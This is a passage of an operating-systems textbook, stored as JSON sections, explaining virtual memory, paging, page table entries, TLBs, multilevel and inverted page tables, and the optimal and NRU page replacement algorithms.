core\r\nimage, up to 64 KB, must be present on the disk, however, so that pieces can be\r\nbrought in as needed.\r\nThe virtual address space consists of fixed-size units called pages. The corres\u0002ponding units in the physical memory are called page frames. The pages and page\r\nframes are generally the same size. In this example they are 4 KB, but page sizes\r\nfrom 512 bytes to a gigabyte have been used in real systems. With 64 KB of virtual\r\naddress space and 32 KB of physical memory, we get 16 virtual pages and 8 page\r\nframes. Transfers between RAM and disk are always in whole pages. Many proc\u0002essors support multiple page sizes that can be mixed and matched as the operating\r\nsystem sees fit. For instance, the x86-64 architecture supports 4-KB, 2-MB, and\r\n1-GB pages, so we could use 4-KB pages for user applications and a single 1-GB\r\npage for the kernel. We will see later why it is sometimes better to use a single\r\nlarge page, rather than a large number of small ones.\r\nThe notation in Fig. 3-9 is as follows. The range marked 0K–4K means that\r\nthe virtual or physical addresses in that page are 0 to 4095. The range 4K–8K\r\nrefers to addresses 4096 to 8191, and so on. Each page contains exactly 4096 ad\u0002dresses starting at a multiple of 4096 and ending one shy of a multiple of 4096.\r\nWhen the program tries to access address 0, for example, using the instruction\r\nMOV REG,0\r\nvirtual address 0 is sent to the MMU. The MMU sees that this virtual address falls\r\nin page 0 (0 to 4095), which according to its mapping is page frame 2 (8192 to\r\n12287). It thus transforms the address to 8192 and outputs address 8192 onto the\r\nbus. The memory knows nothing at all about the MMU and just sees a request for\r\nreading or writing address 8192, which it honors. Thus, the MMU has effectively\r\nmapped all virtual addresses between 0 and 4095 onto physical addresses 8192 to\r\n12287.\r\nSimilarly, the instruction\r\nMOV REG,8192\r\nis effectively transformed into\r\nMOV REG,24576\nSEC. 3.3 VIRTUAL MEMORY 197\r\nVirtual\r\naddress\r\nspace\r\nPhysical\r\nmemory\r\naddress\r\n60K–64K\r\n56K–60K\r\n52K–56K\r\n48K–52K\r\n44K–48K\r\n40K–44K\r\n36K–40K\r\n32K–36K\r\n28K–32K\r\n24K–28K\r\n20K–24K\r\n16K–20K\r\n12K–16K\r\n8K–12K\r\n4K–8K\r\n0K–4K\r\n28K–32K\r\n24K–28K\r\n20K–24K\r\n16K–20K\r\n12K–16K\r\n8K–12K\r\n4K–8K\r\n 0K–4K\r\nVirtual page\r\nPage frame\r\nX\r\nX\r\nX\r\nX\r\n7\r\nX\r\n5\r\nX\r\nX\r\nX\r\n3\r\n4\r\n0\r\n6\r\n1\r\n2\r\nFigure 3-9. The relation between virtual addresses and physical memory ad\u0002dresses is given by the page table. Every page begins on a multiple of 4096 and\r\nends 4095 addresses higher, so 4K–8K really means 4096–8191 and 8K to 12K\r\nmeans 8192–12287.\r\nbecause virtual address 8192 (in virtual page 2) is mapped onto 24576 (in physical\r\npage frame 6). As a third example, virtual address 20500 is 20 bytes from the start\r\nof virtual page 5 (virtual addresses 20480 to 24575) and maps onto physical ad\u0002dress 12288 + 20 = 12308.\r\nBy itself, this ability to map the 16 virtual pages onto any of the eight page\r\nframes by setting the MMU’s map appropriately does not solve the problem that\r\nthe virtual address space is larger than the physical memory. Since we have only\r\neight physical page frames, only eight of the virtual pages in Fig. 3-9 are mapped\r\nonto physical memory. The others, shown as a cross in the figure, are not mapped.\r\nIn the actual hardware, a Present/absent bit keeps track of which pages are physi\u0002cally present in memory.\r\nWhat happens if the program references an unmapped address, for example, by\r\nusing the instruction\r\nMOV REG,32780\r\nwhich is byte 12 within virtual page 8 (starting at 32768)? The MMU notices that\r\nthe page is unmapped (indicated by a cross in the figure) and causes the CPU to\n198 MEMORY MANAGEMENT CHAP. 3\r\ntrap to the operating system. This trap is called a page fault. The operating system\r\npicks a little-used page frame and writes its contents back to the disk (if it is not al\u0002ready there). It then fetches (also from the disk) the page that was just referenced\r\ninto the page frame just freed, changes the map, and restarts the trapped instruc\u0002tion.\r\nFor example, if the operating system decided to evict page frame 1, it would\r\nload virtual page 8 at physical address 4096 and make two changes to the MMU\r\nmap. First, it would mark virtual page 1’s entry as unmapped, to trap any future ac\u0002cesses to virtual addresses between 4096 and 8191. Then it would replace the\r\ncross in virtual page 8’s entry with a 1, so that when the trapped instruction is reex\u0002ecuted, it will map virtual address 32780 to physical address 4108 (4096 + 12).\r\nNow let us look inside the MMU to see how it works and why we hav e chosen\r\nto use a page size that is a power of 2. In Fig. 3-10 we see an example of a virtual\r\naddress, 8196 (0010000000000100 in binary), being mapped using the MMU map\r\nof Fig. 3-9. The incoming 16-bit virtual address is split into a 4-bit page number\r\nand a 12-bit offset. With 4 bits for the page number, we can have 16 pages, and\r\nwith 12 bits for the offset, we can address all 4096 bytes within a page.\r\nThe page number is used as an index into the page table, yielding the number\r\nof the page frame corresponding to that virtual page. If the Present/absent bit is 0,\r\na trap to the operating system is caused. If the bit is 1, the page frame number\r\nfound in the page table is copied to the high-order 3 bits of the output register,\r\nalong with the 12-bit offset, which is copied unmodified from the incoming virtual\r\naddress. Together they form a 15-bit physical address. The output register is then\r\nput onto the memory bus as the physical memory address."
          },
          "3.3.2 Page Tables": {
            "page": 229,
            "content": "3.3.2 Page Tables\r\nIn a simple implementation, the mapping of virtual addresses onto physical ad\u0002dresses can be summarized as follows: the virtual address is split into a virtual\r\npage number (high-order bits) and an offset (low-order bits). For example, with a\r\n16-bit address and a 4-KB page size, the upper 4 bits could specify one of the 16\r\nvirtual pages and the lower 12 bits would then specify the byte offset (0 to 4095)\r\nwithin the selected page. However a split with 3 or 5 or some other number of bits\r\nfor the page is also possible. Different splits imply different page sizes.\r\nThe virtual page number is used as an index into the page table to find the\r\nentry for that virtual page. From the page table entry, the page frame number (if\r\nany) is found. The page frame number is attached to the high-order end of the off\u0002set, replacing the virtual page number, to form a physical address that can be sent\r\nto the memory.\r\nThus, the purpose of the page table is to map virtual pages onto page frames.\r\nMathematically speaking, the page table is a function, with the virtual page num\u0002ber as argument and the physical frame number as result. Using the result of this\nSEC. 3.3 VIRTUAL MEMORY 199\r\n15\r\n14\r\n13\r\n12\r\n11\r\n10\r\n9\r\n8\r\n7\r\n6\r\n5\r\n4\r\n3\r\n2\r\n1\r\n0\r\n000\r\n000\r\n000\r\n000\r\n111\r\n000\r\n101\r\n000\r\n000\r\n000\r\n011\r\n100\r\n000\r\n110\r\n001\r\n010\r\n0\r\n0\r\n0\r\n0\r\n1\r\n0\r\n1\r\n0\r\n0\r\n0\r\n1\r\n1\r\n1\r\n1\r\n1\r\n1 Present/\r\nabsent bit\r\nPage\r\ntable\r\n12-bit offset\r\ncopied directly\r\nfrom input\r\nto output\r\nVirtual page = 2 is used\r\nas an index into the\r\npage table Incoming\r\nvirtual\r\naddress\r\n(8196)\r\nOutgoing\r\nphysical\r\naddress\r\n(24580)\r\n110\r\n1 1 0 0 0 0 0 0 0 0 0 0 1 0 0\r\n0 0 1 0 0 0 0 0 0 0 0 0 0 1 0 0\r\nFigure 3-10. The internal operation of the MMU with 16 4-KB pages.\r\nfunction, the virtual page field in a virtual address can be replaced by a page frame\r\nfield, thus forming a physical memory address.\r\nIn this chapter, we worry only about virtual memory and not full virtualization.\r\nIn other words: no virtual machines yet. We will see in Chap. 7 that each virtual\r\nmachine requires its own virtual memory and as a result the page table organiza\u0002tion becomes much more complicated—involving shadow or nested page tables\r\nand more. Even without such arcane configurations, paging and virtual memory\r\nare fairly sophisticated, as we shall see.\r\nStructure of a Page Table Entry\r\nLet us now turn from the structure of the page tables in the large, to the details\r\nof a single page table entry. The exact layout of an entry in the page table is highly\r\nmachine dependent, but the kind of information present is roughly the same from\r\nmachine to machine. In Fig. 3-11 we present a sample page table entry. The size\n200 MEMORY MANAGEMENT CHAP. 3\r\nvaries from computer to computer, but 32 bits is a common size. The most impor\u0002tant field is the Pa g e frame number. After all, the goal of the page mapping is to\r\noutput this value. Next to it we have the Present/absent bit. If this bit is 1, the\r\nentry is valid and can be used. If it is 0, the virtual page to which the entry belongs\r\nis not currently in memory. Accessing a page table entry with this bit set to 0\r\ncauses a page fault.\r\nCaching\r\ndisabled Modified Present/absent\r\nPage frame number\r\nReferenced Protection \r\n\r\nFigure 3-11. A typical page table entry.\r\nThe Protection bits tell what kinds of access are permitted. In the simplest\r\nform, this field contains 1 bit, with 0 for read/write and 1 for read only. A more\r\nsophisticated arrangement is having 3 bits, one bit each for enabling reading, writ\u0002ing, and executing the page.\r\nThe Modified and Referenced bits keep track of page usage. When a page is\r\nwritten to, the hardware automatically sets the Modified bit. This bit is of value\r\nwhen the operating system decides to reclaim a page frame. If the page in it has\r\nbeen modified (i.e., is ‘‘dirty’’), it must be written back to the disk. If it has not\r\nbeen modified (i.e., is ‘‘clean’’), it can just be abandoned, since the disk copy is\r\nstill valid. The bit is sometimes called the dirty bit, since it reflects the page’s\r\nstate.\r\nThe Referenced bit is set whenever a page is referenced, either for reading or\r\nfor writing. Its value is used to help the operating system choose a page to evict\r\nwhen a page fault occurs. Pages that are not being used are far better candidates\r\nthan pages that are, and this bit plays an important role in several of the page re\u0002placement algorithms that we will study later in this chapter.\r\nFinally, the last bit allows caching to be disabled for the page. This feature is\r\nimportant for pages that map onto device registers rather than memory. If the oper\u0002ating system is sitting in a tight loop waiting for some I/O device to respond to a\r\ncommand it was just given, it is essential that the hardware keep fetching the word\r\nfrom the device, and not use an old cached copy. With this bit, caching can be\r\nturned off. Machines that have a separate I/O space and do not use memory-map\u0002ped I/O do not need this bit.\r\nNote that the disk address used to hold the page when it is not in memory is\r\nnot part of the page table. The reason is simple. The page table holds only that\r\ninformation the hardware needs to translate a virtual address to a physical address.\nSEC. 3.3 VIRTUAL MEMORY 201\r\nInformation the operating system needs to handle page faults is kept in software\r\ntables inside the operating system. The hardware does not need it.\r\nBefore getting into more implementation issues, it is worth pointing out again\r\nthat what virtual memory fundamentally does is create a new abstraction—the ad\u0002dress space—which is an abstraction of physical memory, just as a process is an\r\nabstraction of the physical processor (CPU). Virtual memory can be implemented\r\nby breaking the virtual address space up into pages, and mapping each one onto\r\nsome page frame of physical memory or having it (temporarily) unmapped. Thus\r\nthis section is bassically about an abstraction created by the operating system and\r\nhow that abstraction is managed."
          },
          "3.3.3 Speeding Up Paging": {
            "page": 232,
            "content": "3.3.3 Speeding Up Paging\r\nWe hav e just seen the basics of virtual memory and paging. It is now time to\r\ngo into more detail about possible implementations. In any paging system, two\r\nmajor issues must be faced:\r\n1. The mapping from virtual address to physical address must be fast.\r\n2. If the virtual address space is large, the page table will be large.\r\nThe first point is a consequence of the fact that the virtual-to-physical mapping\r\nmust be done on every memory reference. All instructions must ultimately come\r\nfrom memory and many of them reference operands in memory as well. Conse\u0002quently, it is necessary to make one, two, or sometimes more page table references\r\nper instruction. If an instruction execution takes, say, 1 nsec, the page table lookup\r\nmust be done in under 0.2 nsec to avoid having the mapping become a major bot\u0002tleneck.\r\nThe second point follows from the fact that all modern computers use virtual\r\naddresses of at least 32 bits, with 64 bits becoming the norm for desktops and lap\u0002tops. With, say, a 4-KB page size, a 32-bit address space has 1 million pages, and a\r\n64-bit address space has more than you want to contemplate. With 1 million pages\r\nin the virtual address space, the page table must have 1 million entries. And\r\nremember that each process needs its own page table (because it has its own virtual\r\naddress space).\r\nThe need for large, fast page mapping is a very significant constraint on the\r\nway computers are built. The simplest design (at least conceptually) is to have a\r\nsingle page table consisting of an array of fast hardware registers, with one entry\r\nfor each virtual page, indexed by virtual page number, as shown in Fig. 3-10.\r\nWhen a process is started up, the operating system loads the registers with the\r\nprocess’ page table, taken from a copy kept in main memory. During process ex\u0002ecution, no more memory references are needed for the page table. The advantages\r\nof this method are that it is straightforward and requires no memory references dur\u0002ing mapping. A disadvantage is that it is unbearably expensive if the page table is\n202 MEMORY MANAGEMENT CHAP. 3\r\nlarge; it is just not practical most of the time. Another one is that having to load\r\nthe full page table at every context switch would completely kill performance.\r\nAt the other extreme, the page table can be entirely in main memory. All the\r\nhardware needs then is a single register that points to the start of the page table.\r\nThis design allows the virtual-to-physical map to be changed at a context switch by\r\nreloading one register. Of course, it has the disadvantage of requiring one or more\r\nmemory references to read page table entries during the execution of each instruc\u0002tion, making it very slow.\r\nTranslation Lookaside Buffers\r\nLet us now look at widely implemented schemes for speeding up paging and\r\nfor handling large virtual address spaces, starting with the former. The starting\r\npoint of most optimization techniques is that the page table is in memory. Poten\u0002tially, this design has an enormous impact on performance. Consider, for example,\r\na 1-byte instruction that copies one register to another. In the absence of paging,\r\nthis instruction makes only one memory reference, to fetch the instruction. With\r\npaging, at least one additional memory reference will be needed, to access the page\r\ntable. Since execution speed is generally limited by the rate at which the CPU can\r\nget instructions and data out of the memory, having to make two memory refer\u0002ences per memory reference reduces performance by half. Under these conditions,\r\nno one would use paging.\r\nComputer designers have known about this problem for years and have come\r\nup with a solution. Their solution is based on the observation that most programs\r\ntend to make a large number of references to a small number of pages, and not the\r\nother way around. Thus only a small fraction of the page table entries are heavily\r\nread; the rest are barely used at all.\r\nThe solution that has been devised is to equip computers with a small hardware\r\ndevice for mapping virtual addresses to physical addresses without going through\r\nthe page table. The device, called a TLB (Translation Lookaside Buffer) or\r\nsometimes an associative memory, is illustrated in Fig. 3-12. It is usually inside\r\nthe MMU and consists of a small number of entries, eight in this example, but\r\nrarely more than 256. Each entry contains information about one page, including\r\nthe virtual page number, a bit that is set when the page is modified, the protection\r\ncode (read/write/execute permissions), and the physical page frame in which the\r\npage is located. These fields have a one-to-one correspondence with the fields in\r\nthe page table, except for the virtual page number, which is not needed in the page\r\ntable. Another bit indicates whether the entry is valid (i.e., in use) or not.\r\nAn example that might generate the TLB of Fig. 3-12 is a process in a loop\r\nthat spans virtual pages 19, 20, and 21, so that these TLB entries have protection\r\ncodes for reading and executing. The main data currently being used (say, an array\r\nbeing processed) are on pages 129 and 130. Page 140 contains the indices used in\r\nthe array calculations. Finally, the stack is on pages 860 and 861.\nSEC. 3.3 VIRTUAL MEMORY 203\r\nValid Virtual page Modified Protection Pag e frame\r\n1 140 1 RW 31\r\n1 20 0 R X 38\r\n1 130 1 RW 29\r\n1 129 1 RW 62\r\n1 19 0 R X 50\r\n1 21 0 R X 45\r\n1 860 1 RW 14\r\n1 861 1 RW 75\r\nFigure 3-12. A TLB to speed up paging.\r\nLet us now see how the TLB functions. When a virtual address is presented to\r\nthe MMU for translation, the hardware first checks to see if its virtual page number\r\nis present in the TLB by comparing it to all the entries simultaneously (i.e., in par\u0002allel). Doing so requires special hardware, which all MMUs with TLBs have. If a\r\nvalid match is found and the access does not violate the protection bits, the page\r\nframe is taken directly from the TLB, without going to the page table. If the virtu\u0002al page number is present in the TLB but the instruction is trying to write on a\r\nread-only page, a protection fault is generated.\r\nThe interesting case is what happens when the virtual page number is not in\r\nthe TLB. The MMU detects the miss and does an ordinary page table lookup. It\r\nthen evicts one of the entries from the TLB and replaces it with the page table\r\nentry just looked up. Thus if that page is used again soon, the second time it will\r\nresult in a TLB hit rather than a miss. When an entry is purged from the TLB, the\r\nmodified bit is copied back into the page table entry in memory. The other values\r\nare already there, except the reference bit. When the TLB is loaded from the page\r\ntable, all the fields are taken from memory.\r\nSoftware TLB Management\r\nUp until now, we hav e assumed that every machine with paged virtual memory\r\nhas page tables recognized by the hardware, plus a TLB. In this design, TLB man\u0002agement and handling TLB faults are done entirely by the MMU hardware. Traps\r\nto the operating system occur only when a page is not in memory.\r\nIn the past, this assumption was true. However, many RISC machines, includ\u0002ing the SPARC, MIPS, and (the now dead) HP PA, do nearly all of this page man\u0002agement in software. On these machines, the TLB entries are explicitly loaded by\r\nthe operating system. When a TLB miss occurs, instead of the MMU going to the\r\npage tables to find and fetch the needed page reference, it just generates a TLB\r\nfault and tosses the problem into the lap of the operating system. The system must\r\nfind the page, remove an entry from the TLB, enter the new one, and restart the\n204 MEMORY MANAGEMENT CHAP. 3\r\ninstruction that faulted. And, of course, all of this must be done in a handful of in\u0002structions because TLB misses occur much more frequently than page faults.\r\nSurprisingly enough, if the TLB is moderately large (say, 64 entries) to reduce\r\nthe miss rate, software management of the TLB turns out to be acceptably efficient.\r\nThe main gain here is a much simpler MMU, which frees up a considerable\r\namount of area on the CPU chip for caches and other features that can improve\r\nperformance. Software TLB management is discussed by Uhlig et al. (1994).\r\nVarious strategies were developed long ago to improve performance on ma\u0002chines that do TLB management in software. One approach attacks both reducing\r\nTLB misses and reducing the cost of a TLB miss when it does occur (Bala et al.,\r\n1994). To reduce TLB misses, sometimes the operating system can use its intu\u0002ition to figure out which pages are likely to be used next and to preload entries for\r\nthem in the TLB. For example, when a client process sends a message to a server\r\nprocess on the same machine, it is very likely that the server will have to run soon.\r\nKnowing this, while processing the trap to do the send, the system can also check\r\nto see where the server’s code, data, and stack pages are and map them in before\r\nthey get a chance to cause TLB faults.\r\nThe normal way to process a TLB miss, whether in hardware or in software, is\r\nto go to the page table and perform the indexing operations to locate the page refer\u0002enced. The problem with doing this search in software is that the pages holding the\r\npage table may not be in the TLB, which will cause additional TLB faults during\r\nthe processing. These faults can be reduced by maintaining a large (e.g., 4-KB)\r\nsoftware cache of TLB entries in a fixed location whose page is always kept in the\r\nTLB. By first checking the software cache, the operating system can substantially\r\nreduce TLB misses.\r\nWhen software TLB management is used, it is essential to understand the dif\u0002ference between different kinds of misses. A soft miss occurs when the page refer\u0002enced is not in the TLB, but is in memory. All that is needed here is for the TLB to\r\nbe updated. No disk I/O is needed. Typically a soft miss takes 10–20 machine in\u0002structions to handle and can be completed in a couple of nanoseconds. In contrast,\r\na hard miss occurs when the page itself is not in memory (and of course, also not\r\nin the TLB). A disk access is required to bring in the page, which can take sev eral\r\nmilliseconds, depending on the disk being used. A hard miss is easily a million\r\ntimes slower than a soft miss. Looking up the mapping in the page table hierarchy\r\nis known as a page table walk.\r\nActually, it is worse that that. A miss is not just soft or hard. Some misses are\r\nslightly softer (or slightly harder) than other misses. For instance, suppose the\r\npage walk does not find the page in the process’ page table and the program thus\r\nincurs a page fault. There are three possibilities. First, the page may actually be in\r\nmemory, but not in this process’ page table. For instance, the page may have been\r\nbrought in from disk by another process. In that case, we do not need to access the\r\ndisk again, but merely map the page appropriately in the page tables. This is a\r\npretty soft miss that is known as a minor page fault. Second, a major page fault\nSEC. 3.3 VIRTUAL MEMORY 205\r\noccurs if the page needs to be brought in from disk. Third, it is possible that the\r\nprogram simply accessed an invalid address and no mapping needs to be added in\r\nthe TLB at all. In that case, the operating system typically kills the program with a\r\nsegmentation fault. Only in this case did the program do something wrong. All\r\nother cases are automatically fixed by the hardware and/or the operating sys\u0002tem—at the cost of some performance."
          },
          "3.3.4 Page Tables for Large Memories": {
            "page": 236,
            "content": "3.3.4 Page Tables for Large Memories\r\nTLBs can be used to speed up virtual-to-physical address translation over the\r\noriginal page-table-in-memory scheme. But that is not the only problem we have to\r\ntackle. Another problem is how to deal with very large virtual address spaces.\r\nBelow we will discuss two ways of dealing with them.\r\nMultilevel Page Tables\r\nAs a first approach, consider the use of a multilevel page table. A simple ex\u0002ample is shown in Fig. 3-13. In Fig. 3-13(a) we have a 32-bit virtual address that is\r\npartitioned into a 10-bit PT1 field, a 10-bit PT2 field, and a 12-bit Offset field.\r\nSince offsets are 12 bits, pages are 4 KB, and there are a total of 220 of them.\r\nThe secret to the multilevel page table method is to avoid keeping all the page\r\ntables in memory all the time. In particular, those that are not needed should not\r\nbe kept around. Suppose, for example, that a process needs 12 megabytes: the bot\u0002tom 4 megabytes of memory for program text, the next 4 megabytes for data, and\r\nthe top 4 megabytes for the stack. In between the top of the data and the bottom of\r\nthe stack is a gigantic hole that is not used.\r\nIn Fig. 3-13(b) we see how the two-level page table works. On the left we see\r\nthe top-level page table, with 1024 entries, corresponding to the 10-bit PT1 field.\r\nWhen a virtual address is presented to the MMU, it first extracts the PT1 field and\r\nuses this value as an index into the top-level page table. Each of these 1024 entries\r\nin the top-level page table represents 4M because the entire 4-gigabyte (i.e., 32-bit)\r\nvirtual address space has been chopped into chunks of 4096 bytes.\r\nThe entry located by indexing into the top-level page table yields the address\r\nor the page frame number of a second-level page table. Entry 0 of the top-level\r\npage table points to the page table for the program text, entry 1 points to the page\r\ntable for the data, and entry 1023 points to the page table for the stack. The other\r\n(shaded) entries are not used. The PT2 field is now used as an index into the selec\u0002ted second-level page table to find the page frame number for the page itself.\r\nAs an example, consider the 32-bit virtual address 0x00403004 (4,206,596\r\ndecimal), which is 12,292 bytes into the data. This virtual address corresponds to\r\nPT1 = 1, PT2 = 3, and Offset = 4. The MMU first uses PT1 to index into the top-\n206 MEMORY MANAGEMENT CHAP. 3\r\n(a)\r\n(b)\r\nTop-level\r\npage table\r\nSecond-level\r\npage tables\r\nTo\r\npages\r\nPage\r\ntable for\r\nthe top\r\n4M of\r\nmemory\r\n6\r\n5\r\n4\r\n3\r\n2\r\n1\r\n0\r\n1023\r\n6\r\n5\r\n4\r\n3\r\n2\r\n1\r\n0\r\n1023\r\nBits 10 10 12\r\nPT1 PT2 Offset\r\nFigure 3-13. (a) A 32-bit address with two page table fields. (b) Tw o-level page\r\ntables.\r\nlevel page table and obtain entry 1, which corresponds to addresses 4M to 8M − 1.\r\nIt then uses PT2 to index into the second-level page table just found and extract\r\nentry 3, which corresponds to addresses 12288 to 16383 within its 4M chunk (i.e.,\r\nabsolute addresses 4,206,592 to 4,210,687). This entry contains the page frame\r\nnumber of the page containing virtual address 0x00403004. If that page is not in\r\nmemory, the Present/absent bit in the page table entry will have the value zero,\r\ncausing a page fault. If the page is present in memory, the page frame number\nSEC. 3.3 VIRTUAL MEMORY 207\r\ntaken from the second-level page table is combined with the offset (4) to construct\r\nthe physical address. This address is put on the bus and sent to memory.\r\nThe interesting thing to note about Fig. 3-13 is that although the address space\r\ncontains over a million pages, only four page tables are needed: the top-level table,\r\nand the second-level tables for 0 to 4M (for the program text), 4M to 8M (for the\r\ndata), and the top 4M (for the stack). The Present/absent bits in the remaining\r\n1021 entries of the top-level page table are set to 0, forcing a page fault if they are\r\nev er accessed. Should this occur, the operating system will notice that the process\r\nis trying to reference memory that it is not supposed to and will take appropriate\r\naction, such as sending it a signal or killing it. In this example we have chosen\r\nround numbers for the various sizes and have picked PT1 equal to PT2, but in ac\u0002tual practice other values are also possible, of course.\r\nThe two-level page table system of Fig. 3-13 can be expanded to three, four, or\r\nmore levels. Additional levels give more flexibility. For instance, Intel’s 32 bit\r\n80386 processor (launched in 1985) was able to address up to 4-GB of memory,\r\nusing a two-level page table that consisted of a page directory whose entries\r\npointed to page tables, which, in turn, pointed to the actual 4-KB page frames.\r\nBoth the page directory and the page tables each contained 1024 entries, giving a\r\ntotal of 210 × 210 × 212 = 232 addressable bytes, as desired.\r\nTen years later, the Pentium Pro introduced another level: the page directory\r\npointer table. In addition, it extended each entry in each level of the page table\r\nhierarchy from 32 bits to 64 bits, so that it could address memory above the 4-GB\r\nboundary. As it had only 4 entries in the page directory pointer table, 512 in each\r\npage directory, and 512 in each page table, the total amount of memory it could ad\u0002dress was still limited to a maximum of 4 GB. When proper 64-bit support was\r\nadded to the x86 family (originally by AMD), the additional level could have been\r\ncalled the ‘‘page directory pointer table pointer’’ or something equally horri. That\r\nwould have been perfectly in line with how chip makers tend to name things. Mer\u0002cifully, they did not do this. The alternative they cooked up, ‘‘page map level 4,’’\r\nmay not be a terribly catchy name either, but at least it is short and a bit clearer. At\r\nany rate, these processors now use all 512 entries in all tables, yielding an amount\r\nof addressable memory of 29 × 29 × 29 × 29 × 212 = 248 bytes. They could have\r\nadded another level, but they probably thought that 256 TB would be sufficient for\r\na while.\r\nInverted Page Tables\r\nAn alternative to ever-increasing levels in a paging hierarchy is known as\r\ninverted page tables. They were first used by such processors as the PowerPC,\r\nthe UltraSPARC, and the Itanium (sometimes referred to as ‘‘Itanic,’’ as it was not\r\nnearly the success Intel had hoped for). In this design, there is one entry per page\r\nframe in real memory, rather than one entry per page of virtual address space. For\n208 MEMORY MANAGEMENT CHAP. 3\r\nexample, with 64-bit virtual addresses, a 4-KB page size, and 4 GB of RAM, an\r\ninverted page table requires only 1,048,576 entries. The entry keeps track of which\r\n(process, virtual page) is located in the page frame.\r\nAlthough inverted page tables save lots of space, at least when the virtual ad\u0002dress space is much larger than the physical memory, they hav e a serious down\u0002side: virtual-to-physical translation becomes much harder. When process n refer\u0002ences virtual page p, the hardware can no longer find the physical page by using p\r\nas an index into the page table. Instead, it must search the entire inverted page table\r\nfor an entry (n, p). Furthermore, this search must be done on every memory refer\u0002ence, not just on page faults. Searching a 256K table on every memory reference is\r\nnot the way to make your machine blindingly fast.\r\nThe way out of this dilemma is to make use of the TLB. If the TLB can hold\r\nall of the heavily used pages, translation can happen just as fast as with regular\r\npage tables. On a TLB miss, however, the inverted page table has to be searched in\r\nsoftware. One feasible way to accomplish this search is to have a hash table hashed\r\non the virtual address. All the virtual pages currently in memory that have the same\r\nhash value are chained together, as shown in Fig. 3-14. If the hash table has as\r\nmany slots as the machine has physical pages, the average chain will be only one\r\nentry long, greatly speeding up the mapping. Once the page frame number has\r\nbeen found, the new (virtual, physical) pair is entered into the TLB.\r\nTraditional page\r\ntable with an entry\r\nfor each of the 252\r\npages\r\n1-GB physical\r\nmemory has 218\r\n4-KB page frames Hash table\r\n218 -1\r\n252 -1\r\n218 -1\r\n0 0\r\nIndexed\r\nby virtual\r\npage\r\n0\r\nIndexed\r\nby hash on\r\nvirtual page\r\nVirtual\r\npage\r\nPage\r\nframe\r\nFigure 3-14. Comparison of a traditional page table with an inverted page table.\r\nInverted page tables are common on 64-bit machines because even with a very\r\nlarge page size, the number of page table entries is gigantic. For example, with\r\n4-MB pages and 64-bit virtual addresses, 242 page table entries are needed. Other\r\napproaches to handling large virtual memories can be found in Talluri et al. (1995).\nSEC. 3.4 PA GE REPLACEMENT ALGORITHMS 209"
          }
        }
      },
      "3.4 PAGE REPLACEMENT ALGORITHMS": {
        "page": 240,
        "children": {
          "3.4.1 The Optimal Page Replacement Algorithm": {
            "page": 240,
            "content": "3.4.1 The Optimal Page Replacement Algorithm\r\nThe best possible page replacement algorithm is easy to describe but impossi\u0002ble to actually implement. It goes like this. At the moment that a page fault oc\u0002curs, some set of pages is in memory. One of these pages will be referenced on the\r\nvery next instruction (the page containing that instruction). Other pages may not\n210 MEMORY MANAGEMENT CHAP. 3\r\nbe referenced until 10, 100, or perhaps 1000 instructions later. Each page can be\r\nlabeled with the number of instructions that will be executed before that page is\r\nfirst referenced.\r\nThe optimal page replacement algorithm says that the page with the highest\r\nlabel should be removed. If one page will not be used for 8 million instructions\r\nand another page will not be used for 6 million instructions, removing the former\r\npushes the page fault that will fetch it back as far into the future as possible. Com\u0002puters, like people, try to put off unpleasant events for as long as they can.\r\nThe only problem with this algorithm is that it is unrealizable. At the time of\r\nthe page fault, the operating system has no way of knowing when each of the pages\r\nwill be referenced next. (We saw a similar situation earlier with the short\u0002est-job-first scheduling algorithm—how can the system tell which job is shortest?)\r\nStill, by running a program on a simulator and keeping track of all page references,\r\nit is possible to implement optimal page replacement on the second run by using\r\nthe page-reference information collected during the first run.\r\nIn this way, it is possible to compare the performance of realizable algorithms\r\nwith the best possible one. If an operating system achieves a performance of, say,\r\nonly 1% worse than the optimal algorithm, effort spent in looking for a better algo\u0002rithm will yield at most a 1% improvement.\r\nTo avoid any possible confusion, it should be made clear that this log of page\r\nreferences refers only to the one program just measured and then with only one\r\nspecific input. The page replacement algorithm derived from it is thus specific to\r\nthat one program and input data. Although this method is useful for evaluating\r\npage replacement algorithms, it is of no use in practical systems. Below we will\r\nstudy algorithms that are useful on real systems."
          },
          "3.4.2 The Not Recently Used Page Replacement Algorithm": {
            "page": 241,
            "content": "3.4.2 The Not Recently Used Page Replacement Algorithm\r\nIn order to allow the operating system to collect useful page usage statistics,\r\nmost computers with virtual memory have two status bits, R and M, associated\r\nwith each page. R is set whenever the page is referenced (read or written). M is\r\nset when the page is written to (i.e., modified). The bits are contained in each page\r\ntable entry, as shown in Fig. 3-11. It is important to realize that these bits must be\r\nupdated on every memory reference, so it is essential that they be set by the hard\u0002ware. Once a bit has been set to 1, it stays 1 until the operating system resets it.\r\nIf the hardware does not have these bits, they can be simulated using the oper\u0002ating system’s page fault and clock interrupt mechanisms. When a process is start\u0002ed up, all of its page table entries are marked as not in memory. As soon as any\r\npage is referenced, a page fault will occur. The operating system then sets the R bit\r\n(in its internal tables), changes the page table entry to point to the correct page,\r\nwith mode READ ONLY, and restarts the instruction. If the page is subsequently\r\nmodified, another page fault will occur, allowing the operating system to set the M\r\nbit and change the page’s mode to READ/WRITE.\nSEC. 3.4 PA GE REPLACEMENT ALGORITHMS 211\r\nThe R and M bits can be used to build a simple paging algorithm as follows.\r\nWhen a process is started up, both page bits for all its pages are set to 0 by the op\u0002erating system. Periodically (e.g., on each clock interrupt), the R bit is cleared, to\r\ndistinguish pages that have not been referenced recently from those that have been.\r\nWhen a page fault occurs, the operating system inspects all the pages and\r\ndivides them into four categories based on the current values of their R and M bits:\r\nClass 0: not referenced, not modified.\r\nClass 1: not referenced, modified.\r\nClass 2: referenced, not modified.\r\nClass 3: referenced, modified.\r\nAlthough class 1 pages seem, at first glance, impossible, they occur when a class 3\r\npage has its R bit cleared by a clock interrupt. Clock interrupts do not clear the M\r\nbit because this information is needed to know whether the page has to be rewritten\r\nto disk or not. Clearing R but not M leads to a class 1 page.\r\nThe NRU (Not Recently Used) algorithm removes a page at random from the\r\nlowest-numbered nonempty class. Implicit in this algorithm is the idea that it is\r\nbetter to remove a modified page that has not been referenced in at least one clock\r\ntick (typically about 20 msec) than a clean page that is in heavy use. The main\r\nattraction of NRU is that it is easy to understand, moderately efficient to imple\u0002ment, and gives a performance that, while certainly not optimal, may be adequate."
          },
          "3.4.3 The First-In, First-Out (FIFO) Page Replacement Algorithm": {
            "page": 242,
